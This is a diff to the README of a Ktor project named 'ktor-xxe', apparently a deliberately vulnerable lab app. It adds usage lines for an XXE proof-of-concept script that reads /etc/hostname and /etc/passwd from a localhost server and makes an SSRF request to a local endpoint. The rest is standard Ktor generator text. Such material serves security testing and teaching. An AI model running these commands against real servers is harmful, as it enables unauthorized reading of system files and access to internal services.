@@ -1,5 +1,14 @@
 # ktor-xxe
 
+To utilize the XXE poc:
+# File disclosure
+python3 xxe.py http://localhost:8080 --file /etc/hostname
+python3 xxe.py http://localhost:8080 --file /etc/passwd
+
+# SSRF
+python3 xxe.py http://localhost:8080 --url http://localhost:8080/health
+
+
 This project was created using the [Ktor Project Generator](https://start.ktor.io).
 
 Here are some useful links to get you started:
